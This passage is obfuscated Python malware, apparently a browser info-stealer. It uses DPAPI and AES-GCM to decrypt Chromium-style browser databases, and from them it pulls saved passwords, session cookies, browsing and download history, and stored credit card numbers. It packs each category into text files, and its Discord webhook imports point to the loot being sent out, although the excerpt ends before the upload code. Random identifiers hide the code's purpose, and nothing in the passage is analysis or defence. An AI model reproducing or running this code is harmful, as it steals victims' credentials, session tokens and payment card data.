                            .replace(r"%EMBED_NAME%", XDRDKLTFJIUFNEAZDALYFMCUQBIDKCEPGTOWNANQZULRCHMPYJVSYNO)
                            .replace(r"%EMBED_ICON%", PEZQXUBYYISJCSLRGSXEGSSOZJFMGNIFHLGUNMFTLGZYHBPULYXXMUEMKBAMMEXZHMLLMA)
                            .replace(r"%FOOTER_TEXT%", KYTKOBRBQHILSBXLLMVIIDOTMYLCMSODXPFYUYELALJDSKOABUSDKRXMDY)
                            .replace(r"%WEBSITE%", ZACXMJQPNZREBPNDHATHODIEPBCAGZLEMBXHOCAKAKJQUPUJRZOQVJEBIXTMOLINIIOYEHI))
                RCIHKFIQKXEWBJIKBTXZYSZRJCQLSHMVJXMBLPFAUYBYDILQQJBJBUTMBPZQNHLORZZYKSXTGFTDBFDVJQOFASQXHZEJC(MQFZAYOFYGBZWUPLTQKCDNUYPMJWXYKGJHLYSAHEEHWPKRKCWVOUKWBGQABNUTPH)
    OWMCIDVJIAYTYUFPGTZJNPVVGIUPHHSPAJWAUBMBALXYDEMXAEOOVNGWSSPSEJRHDIJLLIVCU()

def WXKENTFDBDBLOXMKBKHEQWURYRWBROWVTSEUJUIFLSKQEUTNPMJNMOQLGC():
    import os
    import io
    import zipfile
    import psutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from discord import SyncWebhook, Embed, File
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    ELBTUPFGZSDCXXGQDXCLQMGULXXJOXTHOSKAGHKWODBQTMOIMKCFUFJAAJPDKDWJPRFOUTQPSTORXPLOMMNJ = []
    CDPUMIURYOEBQNYXYCBQZEGEKRWSDFPDMDCZPZRDHRDVYFMJEZKZVVYGJWARVRMAYJEW = []
    IQGUBVTGYZZZOMXSOVNQDFIECGAUBDPUSKIVNUILVDHTNTBYPWDLOHLJSRKGRGUQCYCWSDASMAJCLBX = []
    XJLYBQBZANIVQJQTVWTGQFIBMNITYNHQGFKVDCWBWJDPURXWNPJQPGOQBNRCXDZW = []
    YFKNHMBCDRAIOKOPJWVEGSYLUPPMYCKTJOIHYKQOVORITZPWVYMBLXVYBLHXDI = []
    WAIOVQDJYASOQYKEWPBZQUXCKJHPELVRJOADIROSCHTBARWHEHOI = []

    def HURBTAYTSDEFJYYWXRIPCZDAFHUUVPWRWWCJBUMWDNCRQXPNWMWRLBOSNDVOPJWNCFVQLABADMZJROMTNNHSZIBFKWYAM(KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG):
        if not os.path.exists(KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG):
            return None

        try:
            with open(KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG, 'r', encoding='utf-8') as v4r_f:
                HTAIZVRUBUTLOPKSZSHZDKVXHORNMBGRIEJQNZYQZAJTNVXRIOXIXOFUUXDTUHTISKFFEMLALIXMSWZEAKUXFBKPZPRPXKPYGOH = json.load(v4r_f)

            HCEIXXTMVRLXMCCNWWOTAZFJUKGGYMLJVKFEQXHCUWUYKCYRLJXVZRMVIOYFR_key = base64.b64decode(HTAIZVRUBUTLOPKSZSHZDKVXHORNMBGRIEJQNZYQZAJTNVXRIOXIXOFUUXDTUHTISKFFEMLALIXMSWZEAKUXFBKPZPRPXKPYGOH["os_crypt"]["encrypted_key"])[5:]
            WKYPIZDHNEXLEKNVCQNKBXJQIABPNDJOSBKVTNBMUXYMYNPXXHITCFIDYDY = win32crypt.CryptUnprotectData(HCEIXXTMVRLXMCCNWWOTAZFJUKGGYMLJVKFEQXHCUWUYKCYRLJXVZRMVIOYFR_key, None, None, None, 0)[1]
            return WKYPIZDHNEXLEKNVCQNKBXJQIABPNDJOSBKVTNBMUXYMYNPXXHITCFIDYDY
        except:
            return None

    def TGYKZECNBVJZAILOPKUJHIMVDBDAINBIHQUUXEFBZAMXWGYFUDWNVIBHMUEBRYSCLLZVVQ(ZJPAVQSSZXXNHAAJAKISAQNQKMFUHCPCXNNZFQUZGUSOZYQJQXCEITCNOWYRAJX, WKYPIZDHNEXLEKNVCQNKBXJQIABPNDJOSBKVTNBMUXYMYNPXXHITCFIDYDY):
        try:
            LXVSESYBORVBEIEVWTPNEQVDAUSQCYCTWXUTKUYDJTPZGKMBFOOKDCEQKIGQTUMNFQEKOEKRBMEAXUWEHY = ZJPAVQSSZXXNHAAJAKISAQNQKMFUHCPCXNNZFQUZGUSOZYQJQXCEITCNOWYRAJX[3:15]
            YBCBAOTCNQIHMHQACWQQRFAVLFOUUSMLOPRWSUQGVCULREANJBFJQXOLVIDVEOKVPWK = ZJPAVQSSZXXNHAAJAKISAQNQKMFUHCPCXNNZFQUZGUSOZYQJQXCEITCNOWYRAJX[15:-16]
            QGFSSCVBQWNRPCIDTQSYMXFSECKGWQCVBVNRENAPXCKRIIBUZJBPNOQCXSGQU = ZJPAVQSSZXXNHAAJAKISAQNQKMFUHCPCXNNZFQUZGUSOZYQJQXCEITCNOWYRAJX[-16:]
            DMNKXXSPDOWRNGHBAKWMDXLGYZYZHYLRTJVUGFAVYPLXNMJHVGNSDIIFUKSJYPSJXFZUSIWCLDSNYEVWAH = Cipher(algorithms.AES(WKYPIZDHNEXLEKNVCQNKBXJQIABPNDJOSBKVTNBMUXYMYNPXXHITCFIDYDY), modes.GCM(LXVSESYBORVBEIEVWTPNEQVDAUSQCYCTWXUTKUYDJTPZGKMBFOOKDCEQKIGQTUMNFQEKOEKRBMEAXUWEHY, QGFSSCVBQWNRPCIDTQSYMXFSECKGWQCVBVNRENAPXCKRIIBUZJBPNOQCXSGQU))
            WLUYZLKOGUJNSUXHJVLYHZDIENYZPTKJHPFTRWEQECVKGSLDJQJVZERADMNY = DMNKXXSPDOWRNGHBAKWMDXLGYZYZHYLRTJVUGFAVYPLXNMJHVGNSDIIFUKSJYPSJXFZUSIWCLDSNYEVWAH.decryptor()
            UFUAULPVCSERWHYGFRYZPXTMHLXEXMXCVSDPSZKNACTWPIVQTDLVA = WLUYZLKOGUJNSUXHJVLYHZDIENYZPTKJHPFTRWEQECVKGSLDJQJVZERADMNY.update(YBCBAOTCNQIHMHQACWQQRFAVLFOUUSMLOPRWSUQGVCULREANJBFJQXOLVIDVEOKVPWK) + WLUYZLKOGUJNSUXHJVLYHZDIENYZPTKJHPFTRWEQECVKGSLDJQJVZERADMNY.finalize()
            return UFUAULPVCSERWHYGFRYZPXTMHLXEXMXCVSDPSZKNACTWPIVQTDLVA.decode()
        except:
            return None
        
    def AJJOLZWYSNJHEAQCCJJVLERXIRWAKBXUWZMYFOWFIBLUSOJZQNEYNHQWWYKLDAXBY(KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE, YQHKZPEVQCSKBZLGZQGAZYAMIZPEKZRAJQIQSXDGSTRKZKKPFEEXXMCZDQCFEZAXGZKURRSTESRA, WKYPIZDHNEXLEKNVCQNKBXJQIABPNDJOSBKVTNBMUXYMYNPXXHITCFIDYDY):
        KQJABEUZNPLIMTAHCVVLVIWARRCUOQVPGDWRGKXFKXXJTHHSAKRMFXMCF_db = os.path.join(YQHKZPEVQCSKBZLGZQGAZYAMIZPEKZRAJQIQSXDGSTRKZKKPFEEXXMCZDQCFEZAXGZKURRSTESRA, 'Login Data')
        if not os.path.exists(KQJABEUZNPLIMTAHCVVLVIWARRCUOQVPGDWRGKXFKXXJTHHSAKRMFXMCF_db):
            return

        IZXNZUCZUFTVWONDYBBNQWQYACXSINPMZKHDRTWWOXHEKBCPHGIATYOKCBCQVOHEXBF = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(KQJABEUZNPLIMTAHCVVLVIWARRCUOQVPGDWRGKXFKXXJTHHSAKRMFXMCF_db)
        disk_conn.backup(IZXNZUCZUFTVWONDYBBNQWQYACXSINPMZKHDRTWWOXHEKBCPHGIATYOKCBCQVOHEXBF)
        disk_conn.close()
        CVLXWLDUBBNMIWLBRLVTHXWOXTQQQVFAJQORTQTUFTIHWQPZYDAHFLOSDAMXWMOYJDFCUEBQF = IZXNZUCZUFTVWONDYBBNQWQYACXSINPMZKHDRTWWOXHEKBCPHGIATYOKCBCQVOHEXBF.cursor()
        CVLXWLDUBBNMIWLBRLVTHXWOXTQQQVFAJQORTQTUFTIHWQPZYDAHFLOSDAMXWMOYJDFCUEBQF.execute('SELECT action_url, username_value, password_value FROM logins')

        for v4r_row in CVLXWLDUBBNMIWLBRLVTHXWOXTQQQVFAJQORTQTUFTIHWQPZYDAHFLOSDAMXWMOYJDFCUEBQF.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            MTILTYGCQWWWINDRRRHKZLTBIQQJJHFBKGEIAGFMUTKUHILZRJOTBCIBXBXTVFZJRSDCRMBMWLGZBNHSDEKMLHGRJ =          f"- Url      : {v4r_row[0]}"
            KIIJCVCOOZAOHUMEWTRNVLMVBQLHZHYICNFREDBHWIAVHQVAPPPJQCNACXKUHWXRXJYVFSBHVRWCPAOA =     f"  Username : {v4r_row[1]}"
            KQJABEUZNPLIMTAHCVVLVIWARRCUOQVPGDWRGKXFKXXJTHHSAKRMFXMCF =     f"  Password : {TGYKZECNBVJZAILOPKUJHIMVDBDAINBIHQUUXEFBZAMXWGYFUDWNVIBHMUEBRYSCLLZVVQ(v4r_row[2], WKYPIZDHNEXLEKNVCQNKBXJQIABPNDJOSBKVTNBMUXYMYNPXXHITCFIDYDY)}"
            KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE_name = f"  Browser  : {KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE}"
            ELBTUPFGZSDCXXGQDXCLQMGULXXJOXTHOSKAGHKWODBQTMOIMKCFUFJAAJPDKDWJPRFOUTQPSTORXPLOMMNJ.append(f"{MTILTYGCQWWWINDRRRHKZLTBIQQJJHFBKGEIAGFMUTKUHILZRJOTBCIBXBXTVFZJRSDCRMBMWLGZBNHSDEKMLHGRJ}\n{KIIJCVCOOZAOHUMEWTRNVLMVBQLHZHYICNFREDBHWIAVHQVAPPPJQCNACXKUHWXRXJYVFSBHVRWCPAOA}\n{KQJABEUZNPLIMTAHCVVLVIWARRCUOQVPGDWRGKXFKXXJTHHSAKRMFXMCF}\n{KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE_name}\n")

        IZXNZUCZUFTVWONDYBBNQWQYACXSINPMZKHDRTWWOXHEKBCPHGIATYOKCBCQVOHEXBF.close()

    def XIMOWEGQYTFCJNOXCKOUSVDNGFFGNTGHMJGIJBLHWOGHVWDVMMMSAYQWRUWUDVYBPUVXRKVLUVJQPWZNNLPXLSEJNFNT(KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE, YQHKZPEVQCSKBZLGZQGAZYAMIZPEKZRAJQIQSXDGSTRKZKKPFEEXXMCZDQCFEZAXGZKURRSTESRA, WKYPIZDHNEXLEKNVCQNKBXJQIABPNDJOSBKVTNBMUXYMYNPXXHITCFIDYDY):
        EZJHOXMFVKOYSMRKTNBYVAIHHKGUDEFVRQEMCZSZHTXFSRSTLSFVNTW = os.path.join(YQHKZPEVQCSKBZLGZQGAZYAMIZPEKZRAJQIQSXDGSTRKZKKPFEEXXMCZDQCFEZAXGZKURRSTESRA, 'Network', 'Cookies')
        if not os.path.exists(EZJHOXMFVKOYSMRKTNBYVAIHHKGUDEFVRQEMCZSZHTXFSRSTLSFVNTW):
            return

        IZXNZUCZUFTVWONDYBBNQWQYACXSINPMZKHDRTWWOXHEKBCPHGIATYOKCBCQVOHEXBF = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(EZJHOXMFVKOYSMRKTNBYVAIHHKGUDEFVRQEMCZSZHTXFSRSTLSFVNTW)
        disk_conn.backup(IZXNZUCZUFTVWONDYBBNQWQYACXSINPMZKHDRTWWOXHEKBCPHGIATYOKCBCQVOHEXBF)
        disk_conn.close()
        CVLXWLDUBBNMIWLBRLVTHXWOXTQQQVFAJQORTQTUFTIHWQPZYDAHFLOSDAMXWMOYJDFCUEBQF = IZXNZUCZUFTVWONDYBBNQWQYACXSINPMZKHDRTWWOXHEKBCPHGIATYOKCBCQVOHEXBF.cursor()
        CVLXWLDUBBNMIWLBRLVTHXWOXTQQQVFAJQORTQTUFTIHWQPZYDAHFLOSDAMXWMOYJDFCUEBQF.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

        for v4r_row in CVLXWLDUBBNMIWLBRLVTHXWOXTQQQVFAJQORTQTUFTIHWQPZYDAHFLOSDAMXWMOYJDFCUEBQF.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            MTILTYGCQWWWINDRRRHKZLTBIQQJJHFBKGEIAGFMUTKUHILZRJOTBCIBXBXTVFZJRSDCRMBMWLGZBNHSDEKMLHGRJ =          f"- Url     : {v4r_row[0]}"
            JHNRJANLHAFFOULYGIOVJYZMPRIYAHKHCEOTFVBFPMKVCRNQJIPZOZEPYUMUOASXPDDT =         f"  Name    : {v4r_row[1]}"
            KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG =         f"  Path    : {v4r_row[2]}"
            ZWGBGOWPJYUXRNCYBETIFBNOEBWFKGXTVFNYJINHRJKJNKJGAQHYIBS =       f"  Cookie  : {TGYKZECNBVJZAILOPKUJHIMVDBDAINBIHQUUXEFBZAMXWGYFUDWNVIBHMUEBRYSCLLZVVQ(v4r_row[3], WKYPIZDHNEXLEKNVCQNKBXJQIABPNDJOSBKVTNBMUXYMYNPXXHITCFIDYDY)}"
            UAOZXSIYKCIJOSPXHXFXDSEVAYTPWXNQJGDSZUGMILGQXDOYEZCFUQQXEOX =       f"  Expire  : {v4r_row[4]}"
            KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE_name = f"  Browser : {KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE}"
            CDPUMIURYOEBQNYXYCBQZEGEKRWSDFPDMDCZPZRDHRDVYFMJEZKZVVYGJWARVRMAYJEW.append(f"{MTILTYGCQWWWINDRRRHKZLTBIQQJJHFBKGEIAGFMUTKUHILZRJOTBCIBXBXTVFZJRSDCRMBMWLGZBNHSDEKMLHGRJ}\n{JHNRJANLHAFFOULYGIOVJYZMPRIYAHKHCEOTFVBFPMKVCRNQJIPZOZEPYUMUOASXPDDT}\n{KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG}\n{ZWGBGOWPJYUXRNCYBETIFBNOEBWFKGXTVFNYJINHRJKJNKJGAQHYIBS}\n{UAOZXSIYKCIJOSPXHXFXDSEVAYTPWXNQJGDSZUGMILGQXDOYEZCFUQQXEOX}\n{KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE_name}\n")

        IZXNZUCZUFTVWONDYBBNQWQYACXSINPMZKHDRTWWOXHEKBCPHGIATYOKCBCQVOHEXBF.close()

    def WEOIYCFAKDCYZIDFPZXSMHVPPUAVHFYWRDFXOJWSDDKEECHXZDXDWGZZLKLIQOILUYOQIDISJG(KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE, YQHKZPEVQCSKBZLGZQGAZYAMIZPEKZRAJQIQSXDGSTRKZKKPFEEXXMCZDQCFEZAXGZKURRSTESRA):
        IZKEFWTMTHPVDZVYZXCZKYLDTCCAGELFITCQDZZNZDJVZMQESKTDANLJWPQQTTIASIHVJIV = os.path.join(YQHKZPEVQCSKBZLGZQGAZYAMIZPEKZRAJQIQSXDGSTRKZKKPFEEXXMCZDQCFEZAXGZKURRSTESRA, 'History')
        if not os.path.exists(IZKEFWTMTHPVDZVYZXCZKYLDTCCAGELFITCQDZZNZDJVZMQESKTDANLJWPQQTTIASIHVJIV):
            return
        
        IZXNZUCZUFTVWONDYBBNQWQYACXSINPMZKHDRTWWOXHEKBCPHGIATYOKCBCQVOHEXBF = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(IZKEFWTMTHPVDZVYZXCZKYLDTCCAGELFITCQDZZNZDJVZMQESKTDANLJWPQQTTIASIHVJIV)
        disk_conn.backup(IZXNZUCZUFTVWONDYBBNQWQYACXSINPMZKHDRTWWOXHEKBCPHGIATYOKCBCQVOHEXBF)
        disk_conn.close()
        CVLXWLDUBBNMIWLBRLVTHXWOXTQQQVFAJQORTQTUFTIHWQPZYDAHFLOSDAMXWMOYJDFCUEBQF = IZXNZUCZUFTVWONDYBBNQWQYACXSINPMZKHDRTWWOXHEKBCPHGIATYOKCBCQVOHEXBF.cursor()
        CVLXWLDUBBNMIWLBRLVTHXWOXTQQQVFAJQORTQTUFTIHWQPZYDAHFLOSDAMXWMOYJDFCUEBQF.execute('SELECT url, title, last_visit_time FROM urls')

        for v4r_row in CVLXWLDUBBNMIWLBRLVTHXWOXTQQQVFAJQORTQTUFTIHWQPZYDAHFLOSDAMXWMOYJDFCUEBQF.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            MTILTYGCQWWWINDRRRHKZLTBIQQJJHFBKGEIAGFMUTKUHILZRJOTBCIBXBXTVFZJRSDCRMBMWLGZBNHSDEKMLHGRJ =          f"- Url     : {v4r_row[0]}"
            APYTHRLKYVQILQJSAMSHYFQAPCUOFGOFLBFTFCTQLJMIAKXDKTDEVPOACCNSKLEHWSXRGEGT =        f"  Title   : {v4r_row[1]}"
            VBYFABQVUQZBKBLGAEVQYRKBMJNUUMMJEFJRMNESQUCHXCRNWMKBRQQJMJZMJACYEXOXQOEPTMNNNYYXPT =         f"  Time    : {v4r_row[2]}"
            KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE_name = f"  Browser : {KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE}"
            IQGUBVTGYZZZOMXSOVNQDFIECGAUBDPUSKIVNUILVDHTNTBYPWDLOHLJSRKGRGUQCYCWSDASMAJCLBX.append(f"{MTILTYGCQWWWINDRRRHKZLTBIQQJJHFBKGEIAGFMUTKUHILZRJOTBCIBXBXTVFZJRSDCRMBMWLGZBNHSDEKMLHGRJ}\n{APYTHRLKYVQILQJSAMSHYFQAPCUOFGOFLBFTFCTQLJMIAKXDKTDEVPOACCNSKLEHWSXRGEGT}\n{VBYFABQVUQZBKBLGAEVQYRKBMJNUUMMJEFJRMNESQUCHXCRNWMKBRQQJMJZMJACYEXOXQOEPTMNNNYYXPT}\n{KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE_name}\n")

        IZXNZUCZUFTVWONDYBBNQWQYACXSINPMZKHDRTWWOXHEKBCPHGIATYOKCBCQVOHEXBF.close()

    def KBUASBCVYHJJAANMFKTJDDMLTVGYGXBSCLFQUQVLMJNQZDZUBXVWNTRIFBYJYZPYTWIUIXXWHKTKNWVK(KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE, YQHKZPEVQCSKBZLGZQGAZYAMIZPEKZRAJQIQSXDGSTRKZKKPFEEXXMCZDQCFEZAXGZKURRSTESRA):
        LCPDWLFFCBKGLQNCLJVQRPZDSECWJYSCKHFLLTPBORWOFMNNWTFGJQNOFMGRNLLGQIDOUJFJWZFFFXPCNKGJQZSKIWEVXNXOHYQI = os.path.join(YQHKZPEVQCSKBZLGZQGAZYAMIZPEKZRAJQIQSXDGSTRKZKKPFEEXXMCZDQCFEZAXGZKURRSTESRA, 'History')
        if not os.path.exists(LCPDWLFFCBKGLQNCLJVQRPZDSECWJYSCKHFLLTPBORWOFMNNWTFGJQNOFMGRNLLGQIDOUJFJWZFFFXPCNKGJQZSKIWEVXNXOHYQI):
            return

        IZXNZUCZUFTVWONDYBBNQWQYACXSINPMZKHDRTWWOXHEKBCPHGIATYOKCBCQVOHEXBF = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(LCPDWLFFCBKGLQNCLJVQRPZDSECWJYSCKHFLLTPBORWOFMNNWTFGJQNOFMGRNLLGQIDOUJFJWZFFFXPCNKGJQZSKIWEVXNXOHYQI)
        disk_conn.backup(IZXNZUCZUFTVWONDYBBNQWQYACXSINPMZKHDRTWWOXHEKBCPHGIATYOKCBCQVOHEXBF)
        disk_conn.close()
        CVLXWLDUBBNMIWLBRLVTHXWOXTQQQVFAJQORTQTUFTIHWQPZYDAHFLOSDAMXWMOYJDFCUEBQF = IZXNZUCZUFTVWONDYBBNQWQYACXSINPMZKHDRTWWOXHEKBCPHGIATYOKCBCQVOHEXBF.cursor()
        CVLXWLDUBBNMIWLBRLVTHXWOXTQQQVFAJQORTQTUFTIHWQPZYDAHFLOSDAMXWMOYJDFCUEBQF.execute('SELECT tab_url, target_path FROM downloads')
        for row in CVLXWLDUBBNMIWLBRLVTHXWOXTQQQVFAJQORTQTUFTIHWQPZYDAHFLOSDAMXWMOYJDFCUEBQF.fetchall():
            if not row[0] or not row[1]:
                continue
            KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG =         f"- Path    : {row[1]}"
            MTILTYGCQWWWINDRRRHKZLTBIQQJJHFBKGEIAGFMUTKUHILZRJOTBCIBXBXTVFZJRSDCRMBMWLGZBNHSDEKMLHGRJ =          f"  Url     : {row[0]}"
            KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE_name = f"  Browser : {KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE}"
            XJLYBQBZANIVQJQTVWTGQFIBMNITYNHQGFKVDCWBWJDPURXWNPJQPGOQBNRCXDZW.append(f"{KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG}\n{MTILTYGCQWWWINDRRRHKZLTBIQQJJHFBKGEIAGFMUTKUHILZRJOTBCIBXBXTVFZJRSDCRMBMWLGZBNHSDEKMLHGRJ}\n{KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE_name}\n")

        IZXNZUCZUFTVWONDYBBNQWQYACXSINPMZKHDRTWWOXHEKBCPHGIATYOKCBCQVOHEXBF.close()

    def OZHMOYVGRETSRWBSIEKDAZBXRRPPWYPWMCOCXXEQONIQUAQSZJIXBRKDT(KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE, YQHKZPEVQCSKBZLGZQGAZYAMIZPEKZRAJQIQSXDGSTRKZKKPFEEXXMCZDQCFEZAXGZKURRSTESRA, WKYPIZDHNEXLEKNVCQNKBXJQIABPNDJOSBKVTNBMUXYMYNPXXHITCFIDYDY):
        OCNDOJFHBRDZIFNLXIWYBGCNEMLGARZBBOAYRSBSAPSVNFKQOFSTEHNKTMWOEFENNOXZDROEUE = os.path.join(YQHKZPEVQCSKBZLGZQGAZYAMIZPEKZRAJQIQSXDGSTRKZKKPFEEXXMCZDQCFEZAXGZKURRSTESRA, 'Web Data')
        if not os.path.exists(OCNDOJFHBRDZIFNLXIWYBGCNEMLGARZBBOAYRSBSAPSVNFKQOFSTEHNKTMWOEFENNOXZDROEUE):
            return

        IZXNZUCZUFTVWONDYBBNQWQYACXSINPMZKHDRTWWOXHEKBCPHGIATYOKCBCQVOHEXBF = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(OCNDOJFHBRDZIFNLXIWYBGCNEMLGARZBBOAYRSBSAPSVNFKQOFSTEHNKTMWOEFENNOXZDROEUE)
        disk_conn.backup(IZXNZUCZUFTVWONDYBBNQWQYACXSINPMZKHDRTWWOXHEKBCPHGIATYOKCBCQVOHEXBF)
        disk_conn.close()
        CVLXWLDUBBNMIWLBRLVTHXWOXTQQQVFAJQORTQTUFTIHWQPZYDAHFLOSDAMXWMOYJDFCUEBQF = IZXNZUCZUFTVWONDYBBNQWQYACXSINPMZKHDRTWWOXHEKBCPHGIATYOKCBCQVOHEXBF.cursor()
        CVLXWLDUBBNMIWLBRLVTHXWOXTQQQVFAJQORTQTUFTIHWQPZYDAHFLOSDAMXWMOYJDFCUEBQF.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for v4r_row in CVLXWLDUBBNMIWLBRLVTHXWOXTQQQVFAJQORTQTUFTIHWQPZYDAHFLOSDAMXWMOYJDFCUEBQF.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            JHNRJANLHAFFOULYGIOVJYZMPRIYAHKHCEOTFVBFPMKVCRNQJIPZOZEPYUMUOASXPDDT =             f"- Name             : {v4r_row[0]}"
            TGHQDVSBXZNWTNKXRVKPXZFSNUOYLDYDLPIVNBOPSMCYTSIXJFUPDQMAGFJLQOJEXKLUCFBUJDDTSALEPYHTTPNDKBOQXHODSDK = f"  Expiration Month : {v4r_row[1]}"
            BRHTNHRHIFBDYZOXKIQRRNBNHUYYAIHNTYWADYKRYDLBXHNXYJVBDBIECIZLSOVQVSJVUUZGVREO =  f"  Expiration Year  : {v4r_row[2]}"
            EYISDTODEGBAMFPCWVIRLJKCFDTCGESLOMRZIITDMCIULIHACTDNHZLGJAYFWYQOPNKRGTJFSTNIVHBGNCMVDJIAGUH =      f"  Card Number      : {TGYKZECNBVJZAILOPKUJHIMVDBDAINBIHQUUXEFBZAMXWGYFUDWNVIBHMUEBRYSCLLZVVQ(v4r_row[3], WKYPIZDHNEXLEKNVCQNKBXJQIABPNDJOSBKVTNBMUXYMYNPXXHITCFIDYDY)}"
            IYQWFEJCLNVZARUGPRVHOPVIWTVOUYDUHOYXQFZKPQWZSOWXQZLCZAGXE =    f"  Date Modified    : {v4r_row[4]}"
            KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE_name =     f"  Browser          : {KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE}"
            YFKNHMBCDRAIOKOPJWVEGSYLUPPMYCKTJOIHYKQOVORITZPWVYMBLXVYBLHXDI.append(f"{JHNRJANLHAFFOULYGIOVJYZMPRIYAHKHCEOTFVBFPMKVCRNQJIPZOZEPYUMUOASXPDDT}\n{TGHQDVSBXZNWTNKXRVKPXZFSNUOYLDYDLPIVNBOPSMCYTSIXJFUPDQMAGFJLQOJEXKLUCFBUJDDTSALEPYHTTPNDKBOQXHODSDK}\n{BRHTNHRHIFBDYZOXKIQRRNBNHUYYAIHNTYWADYKRYDLBXHNXYJVBDBIECIZLSOVQVSJVUUZGVREO}\n{EYISDTODEGBAMFPCWVIRLJKCFDTCGESLOMRZIITDMCIULIHACTDNHZLGJAYFWYQOPNKRGTJFSTNIVHBGNCMVDJIAGUH}\n{IYQWFEJCLNVZARUGPRVHOPVIWTVOUYDUHOYXQFZKPQWZSOWXQZLCZAGXE}\n{KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE_name}\n")
        
        IZXNZUCZUFTVWONDYBBNQWQYACXSINPMZKHDRTWWOXHEKBCPHGIATYOKCBCQVOHEXBF.close()

    def WKJCOWYIAIESBTXBGIUXPFAGEXPSWWQTLZOTZHLGOSWMMHKHXFNFGNMXNXEBBMPLWFBAROJYMAWVOYAYEJBLCLGGRMSCTXOLRYKU(ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE):
        files_in_memory = {}

        if ELBTUPFGZSDCXXGQDXCLQMGULXXJOXTHOSKAGHKWODBQTMOIMKCFUFJAAJPDKDWJPRFOUTQPSTORXPLOMMNJ:
            files_in_memory[f"Passwords_{ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE}.txt"] = '\n'.join(ELBTUPFGZSDCXXGQDXCLQMGULXXJOXTHOSKAGHKWODBQTMOIMKCFUFJAAJPDKDWJPRFOUTQPSTORXPLOMMNJ)

        if CDPUMIURYOEBQNYXYCBQZEGEKRWSDFPDMDCZPZRDHRDVYFMJEZKZVVYGJWARVRMAYJEW:
            files_in_memory[f"Cookies_{ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE}.txt"] = '\n'.join(CDPUMIURYOEBQNYXYCBQZEGEKRWSDFPDMDCZPZRDHRDVYFMJEZKZVVYGJWARVRMAYJEW)

        if IQGUBVTGYZZZOMXSOVNQDFIECGAUBDPUSKIVNUILVDHTNTBYPWDLOHLJSRKGRGUQCYCWSDASMAJCLBX:
